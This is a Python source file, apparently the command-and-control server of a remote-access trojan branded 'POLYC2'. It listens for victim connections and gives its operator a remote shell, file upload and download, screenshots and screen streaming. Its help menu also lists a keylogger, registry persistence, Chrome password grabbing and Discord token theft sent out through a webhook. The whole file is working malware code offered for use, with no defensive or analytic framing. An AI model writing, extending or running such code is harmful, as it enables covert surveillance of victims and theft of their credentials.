import socket
import termcolor
import json
import os
import time
from vidstream import StreamingServer


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
def stream():
    global server
    server = StreamingServer('192.168.10.149', 8080)
    server.start_server()
    reliable_send("stream")

def target_communication():
    count = 0
    while True:
        global ip
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command [:10] == "chromegrab":
            time.sleep(10)
            try:
                download_file("log.txt")
            except:
                print("failed to get chrome password")
        elif command[:10] == 'screenshot':
            f = open('screenshot%d.jpg' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            print("screenshot saved as screenshot%d.jpg" % count)
            count += 1
            continue
        elif command[:6] == "dtoken":
            print("token will be sent through your discord webhook")
        elif command == "keylog_stop":
            print("keylog has been stopped")
        elif command == "stream":
            stream()
        elif command == "stop_stream":
            reliable_send("stop_stream")
            time.sleep(1)
            server.stop_server()
            print("stream has been stopped")
        elif command == 'help':
	            print(termcolor.colored('''
                quit                                --> Quit Session With The Target
                clear                               --> Clear The Screen
                cd *Directory Name*                 --> Changes Directory On Target System
                upload *file name*                  --> Upload File To The target Machine
                download *file name*                --> Download File From Target Machine
                keylog_start                        --> Start The Keylogger
                keylog_dump                         --> Print Keystrokes That The Target Inputted
                keylog_stop                         --> Stop And Self Destruct Keylogger File
                persistence *RegName* *fileName*    --> Create Persistence In Registry
		checkpriv                           --> check admin privilege
		chromegrab                          --> grab chrome passwords
		screenshot                          --> get target screenshot
		dtoken                              --> get target discord token(through discord webhook)''', 'green'))
        else:
            result = reliable_recv()
            print(result)

print("""



██████╗░░█████╗░██╗░░░░░██╗░░░██╗░█████╗░██████╗░
██╔══██╗██╔══██╗██║░░░░░╚██╗░██╔╝██╔══██╗╚════██╗
██████╔╝██║░░██║██║░░░░░░╚████╔╝░██║░░╚═╝░░███╔═╝
██╔═══╝░██║░░██║██║░░░░░░░╚██╔╝░░██║░░██╗██╔══╝░░
██║░░░░░╚█████╔╝███████╗░░░██║░░░╚█████╔╝███████╗

-made by polyester""")


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.10.149', 5555))
print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'green'))
print(termcolor.colored("'help' for options", 'green'))
target_communication()
